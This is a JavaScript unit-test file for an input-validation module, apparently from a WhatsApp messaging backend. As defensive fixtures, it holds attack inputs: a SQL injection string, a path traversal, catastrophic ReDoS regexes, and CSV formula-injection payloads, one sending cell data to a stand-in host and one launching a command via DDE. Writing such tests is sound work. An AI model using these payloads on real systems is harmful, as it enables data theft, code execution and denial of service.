/**
 * Unit tests for src/validate.js — the single boundary every route relies
 * on. These are deliberately adversarial: each block corresponds to a way
 * a client could previously push unbounded or unsafe data into the
 * database, the WhatsApp send path, or the RegExp engine.
 */
const {
    LIMITS, ValidationError,
    requireString, optionalString, normalizePhone, tryNormalizePhone,
    clampInt, clampNumber, requireId, requireEnum, toSqliteUtc,
    assertSafeRegexSource, safeRegexTest, findCatastrophicConstruct,
    sanitizeSpreadsheetCell, validateSettingsPatch
} = require('../src/utils/validate');

describe('validate.requireString', () => {
    test('accepts a normal string and trims it', () => {
        expect(requireString('  hello  ', 'name')).toBe('hello');
    });

    test.each([
        ['number', 42],
        ['boolean', true],
        ['array', ['a']],
        ['object', { a: 1 }],
        ['null', null],
        ['undefined', undefined]
    ])('rejects %s instead of coercing it', (_label, value) => {
        expect(() => requireString(value, 'name')).toThrow(ValidationError);
    });

    test('rejects a string longer than max', () => {
        expect(() => requireString('a'.repeat(201), 'name', { max: 200 })).toThrow(/200 characters or fewer/);
    });

    test('rejects whitespace-only when a value is required', () => {
        expect(() => requireString('    ', 'name')).toThrow(/required/);
    });

    test('optionalString maps null/undefined to empty string', () => {
        expect(optionalString(undefined, 'notes', 10)).toBe('');
        expect(optionalString(null, 'notes', 10)).toBe('');
    });
});

describe('validate.normalizePhone', () => {
    test('strips cosmetic characters people actually type', () => {
        expect(normalizePhone('+91 (98765) 43210')).toBe('919876543210');
        expect(normalizePhone('+1-555-010-9999')).toBe('15550109999');
    });

    test('accepts a plain digit string', () => {
        expect(normalizePhone('919876543210')).toBe('919876543210');
    });

    // The security-critical cases: whatsapp-client.js appends "@c.us"
    // itself, so anything containing an @ or a WhatsApp suffix must never
    // survive validation — otherwise a client picks the destination JID.
    test.each([
        ['group JID', '919876543210@g.us'],
        ['status broadcast', 'status@broadcast'],
        ['bare @c.us', '123456789@c.us'],
        ['LID format', '12345678901234@lid'],
        ['sql injection attempt', "1' OR '1'='1"],
        ['path traversal attempt', '../../../etc/passwd'],
        ['letters', 'abcdefgh'],
        ['empty', ''],
        ['whitespace', '   '],
        ['null byte', '91987654\u00003210']
    ])('rejects %s', (_label, value) => {
        expect(() => normalizePhone(value)).toThrow(ValidationError);
    });

    test('rejects too-short and too-long numbers', () => {
        expect(() => normalizePhone('12345')).toThrow(/between 7 and 15/);
        expect(() => normalizePhone('1'.repeat(16))).toThrow(/between 7 and 15/);
    });

    test('rejects an enormous input without doing work proportional to it', () => {
        expect(() => normalizePhone('9'.repeat(100000))).toThrow(ValidationError);
    });

    test('tryNormalizePhone returns null instead of throwing', () => {
        expect(tryNormalizePhone('nope')).toBeNull();
        expect(tryNormalizePhone('+91 98765 43210')).toBe('919876543210');
    });
});

describe('validate.clampInt (pagination safety)', () => {
    test('clamps an absurd limit down to the maximum', () => {
        expect(clampInt('999999999', { min: 1, max: 500, fallback: 100 })).toBe(500);
    });

    test('clamps a negative limit up to the minimum', () => {
        expect(clampInt('-5', { min: 1, max: 500, fallback: 100 })).toBe(1);
    });

    test.each([['abc'], [''], [null], [undefined], [{}], [[]], [NaN], [Infinity]])(
        'falls back for non-numeric input %p',
        (value) => {
            expect(clampInt(value, { min: 1, max: 500, fallback: 100 })).toBe(100);
        }
    );

    test('truncates a float rather than passing it to SQL', () => {
        expect(clampInt('10.9', { min: 1, max: 500, fallback: 100 })).toBe(10);
    });
});

describe('validate.clampNumber (deal values)', () => {
    // Non-finite input falls back to 0 rather than clamping to the maximum:
    // clamping Infinity to 1e12 would silently accept a nonsense pipeline
    // value as if the user had typed a trillion.
    test('rejects NaN and Infinity', () => {
        expect(clampNumber('not-a-number')).toBe(0);
        expect(clampNumber(Infinity)).toBe(0);
        expect(clampNumber(-Infinity)).toBe(0);
        expect(clampNumber(NaN)).toBe(0);
    });

    test('clamps overflow-scale numbers', () => {
        expect(clampNumber(1e308)).toBe(1e12);
    });

    test('rejects negatives', () => {
        expect(clampNumber(-500)).toBe(0);
    });
});

describe('validate.requireId', () => {
    test('accepts a positive integer string', () => {
        expect(requireId('42')).toBe(42);
    });

    test.each([['0'], ['-1'], ['1abc'], ['abc'], [''], ['1.5'], ['1e21'], ['999999999999999999999'], [null], [{}]])(
        'rejects %p',
        (value) => {
            expect(() => requireId(value)).toThrow(ValidationError);
        }
    );
});

describe('validate.toSqliteUtc', () => {
    test('normalises the dashboard format to canonical UTC', () => {
        expect(toSqliteUtc('2030-01-02 03:04:05')).toBe('2030-01-02 03:04:05');
    });

    // This is the bug that made scheduled jobs fire immediately or never:
    // the stored string has to be comparable to datetime('now'), which is
    // space-separated with no timezone marker.
    test('converts an ISO string with Z into the comparable format', () => {
        expect(toSqliteUtc('2030-01-02T03:04:05Z')).toBe('2030-01-02 03:04:05');
    });

    test('honours an explicit offset', () => {
        expect(toSqliteUtc('2030-01-02T03:04:05+05:30')).toBe('2030-01-01 21:34:05');
    });

    test('output is lexicographically comparable, which is what SQLite relies on', () => {
        const earlier = toSqliteUtc('2030-01-02T03:04:05Z');
        const later = toSqliteUtc('2030-06-02T03:04:05Z');
        expect(earlier < later).toBe(true);
    });

    test.each([['garbage'], [''], ['   '], [null], [42], [{}], ['1899-01-01 00:00:00'], ['2999-01-01 00:00:00']])(
        'rejects %p',
        (value) => {
            expect(() => toSqliteUtc(value)).toThrow(ValidationError);
        }
    );
});

describe('validate.assertSafeRegexSource (ReDoS)', () => {
    // Every pattern here freezes a backtracking engine for exponential
    // time on a crafted input. Since Node cannot interrupt a running
    // RegExp, they must be rejected at write time.
    const CATASTROPHIC = [
        '(a+)+',
        '(a*)*',
        '(a+)*',
        '([a-zA-Z]+)*',
        '(\\d+)+',
        '(a|aa)+',
        '(a|a?)+',
        '(x+x+)+y',
        '(.*a){20}',
        '(a|b|ab)+',
        '(?:a+)+',
        '([a-z]*)+'
    ];

    test.each(CATASTROPHIC)('rejects catastrophic pattern %s', (source) => {
        expect(() => assertSafeRegexSource(source)).toThrow(/hang the server/);
    });

    const SAFE = [
        'hello',
        'hello|hi|hey',
        '^order\\s+\\d+$',
        '[0-9]{4}',
        'price|pricing',
        '\\bhelp\\b',
        '(cat|dog)',       // quantifier-free group is fine
        '(?:price|cost)',
        'a+b+'             // sequential quantifiers, not nested
    ];

    test.each(SAFE)('accepts reasonable pattern %s', (source) => {
        expect(assertSafeRegexSource(source)).toBe(source);
    });

    test('rejects an invalid regex with a helpful message', () => {
        expect(() => assertSafeRegexSource('([unclosed')).toThrow(/not a valid regular expression/);
    });

    test('rejects backreferences', () => {
        expect(() => assertSafeRegexSource('(a)\\1')).toThrow(/Backreferences/);
    });

    test('rejects an over-long pattern', () => {
        expect(() => assertSafeRegexSource('a'.repeat(LIMITS.RULE_REGEX_SOURCE + 1)))
            .toThrow(/characters or fewer/);
    });

    test('findCatastrophicConstruct explains why', () => {
        expect(findCatastrophicConstruct('(a+)+')).toMatch(/repetition/);
        expect(findCatastrophicConstruct('(a|aa)+')).toMatch(/same text/);
        expect(findCatastrophicConstruct('hello')).toBeNull();
    });
});

describe('validate.safeRegexTest', () => {
    test('matches normally', () => {
        expect(safeRegexTest('pric(e|ing)', 'what is the PRICE?')).toBe(true);
        expect(safeRegexTest('^order', 'my order')).toBe(false);
    });

    test('bounds input length so even a slow pattern stays fast', () => {
        const start = Date.now();
        // 'a+b+' is safe but linear-ish; the point is the 1MB input is
        // truncated rather than scanned in full.
        expect(safeRegexTest('a+b+c', 'a'.repeat(1000000))).toBe(false);
        expect(Date.now() - start).toBeLessThan(250);
    });

    test('returns false rather than throwing on an invalid pattern', () => {
        expect(safeRegexTest('([', 'anything')).toBe(false);
    });

    test('non-string input is never matched', () => {
        expect(safeRegexTest('a', null)).toBe(false);
        expect(safeRegexTest('a', 12345)).toBe(false);
    });
});

describe('validate.sanitizeSpreadsheetCell (CSV formula injection)', () => {
    test.each([
        '=HYPERLINK("http://evil.test?d="&A1,"click")',
        '=cmd|\' /C calc\'!A0',
        '+1+1',
        '-1+1',
        '@SUM(A1:A9)',
        '\t=1+1',
        '\r=1+1'
    ])('neutralises %j', (value) => {
        expect(sanitizeSpreadsheetCell(value)).toBe(`'${value}`);
    });

    test('leaves ordinary values untouched', () => {
        expect(sanitizeSpreadsheetCell('Ravi Kumar')).toBe('Ravi Kumar');
        expect(sanitizeSpreadsheetCell('')).toBe('');
        expect(sanitizeSpreadsheetCell('a=b')).toBe('a=b');
    });
});

describe('validate.validateSettingsPatch', () => {
    test('accepts known keys', () => {
        const { accepted, rejected } = validateSettingsPatch({
            chatbot_enabled: 'false',
            default_reply: 'Hi there',
            ai_mode: 'rules_first'
        });
        expect(accepted).toEqual({
            chatbot_enabled: 'false',
            default_reply: 'Hi there',
            ai_mode: 'rules_first'
        });
        expect(rejected).toEqual([]);
    });

    test('normalises real booleans to the strings the code compares against', () => {
        const { accepted } = validateSettingsPatch({ ai_enabled: true, away_mode: false });
        expect(accepted).toEqual({ ai_enabled: 'true', away_mode: 'false' });
    });

    // getSetting(...) === 'true' is how every feature flag is read, so a
    // value like 'TRUE' or 1 would silently disable the feature.
    test('rejects a non-boolean value for a boolean setting', () => {
        expect(() => validateSettingsPatch({ chatbot_enabled: 'yes' })).toThrow(/must be true or false/);
        expect(() => validateSettingsPatch({ chatbot_enabled: 1 })).toThrow(/must be true or false/);
    });

    test('rejects an invalid enum', () => {
        expect(() => validateSettingsPatch({ ai_mode: 'whatever' })).toThrow(/must be one of/);
    });

    test('reports unknown keys instead of writing them', () => {
        const { accepted, rejected } = validateSettingsPatch({ not_a_setting: 'x', role: 'admin' });
        expect(accepted).toEqual({});
        expect(rejected.sort()).toEqual(['not_a_setting', 'role']);
    });

    test('refuses to write server-owned keys', () => {
        const { accepted, rejected } = validateSettingsPatch({ business_ai_profile: '{"pwned":true}' });
        expect(accepted).toEqual({});
        expect(rejected).toEqual(['business_ai_profile']);
    });

    test('enforces per-key length caps', () => {
        expect(() => validateSettingsPatch({ default_reply: 'a'.repeat(5000) })).toThrow(/characters or fewer/);
        expect(() => validateSettingsPatch({ gemini_api_key: 'k'.repeat(500) })).toThrow(/characters or fewer/);
    });

    test('rejects a flood of keys in one request', () => {
        const body = {};
        for (let i = 0; i < 200; i++) body[`k${i}`] = 'v';
        expect(() => validateSettingsPatch(body)).toThrow(/Too many settings/);
    });

    test.each([[null], ['string'], [42], [[1, 2]]])('rejects non-object body %p', (body) => {
        expect(() => validateSettingsPatch(body)).toThrow(/JSON object/);
    });
});

